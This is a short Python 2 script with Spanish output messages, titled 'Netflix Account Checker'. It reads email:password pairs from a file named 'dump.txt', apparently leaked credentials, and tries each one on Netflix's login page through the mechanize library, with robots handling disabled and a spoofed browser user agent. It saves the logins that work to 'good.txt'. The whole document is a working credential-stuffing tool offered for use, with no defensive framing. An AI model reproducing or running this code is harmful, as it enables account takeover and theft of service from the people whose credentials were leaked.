import mechanize
import time


print '[+]---Netflix Account Checker v0.1---[+]'
print '--------------By Ramonem----------------'
time.sleep(2)
contex=0
contno=0

accPass=[]
outfile = open('good.txt', 'w')


br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]
try:
	with open("dump.txt", "r") as filestream:
		for line in filestream:
			br.open('https://www.netflix.com/Login?locale=es-CL')
			currentline = line.split(':')
			br.select_form(nr=0)
			br.form['email'] = currentline[0]
			br.form['password'] = currentline[1]
			print 'Logueando.. mail: '+br.form['email']
			response = br.submit()
			if response.geturl()=='http://www.netflix.com/browse':
				print 'Cuenta activa'
				contex = contex + 1
				br.open('http://www.netflix.com/SignOut?lnkctr=mL')
				accPass.append(currentline[0]+':'+currentline[1])
				time.sleep(2)
			else:
				print 'Muerta..'
				contno = contno + 1
				time.sleep(2)
				
	print 'Escribiendo cuentas activas al txt..'
	for all in accPass:
		print all
		outfile.write(str(all)+'\n')
except:
	print 'Algo malo ocurrio.. Guardando progreso..'
	for all in accPass:
		outfile.write(str(all)+'\n')
	
print 'cuentas activas: ' + str(contex)
print 'cuentas muertas: ' + str(contno)
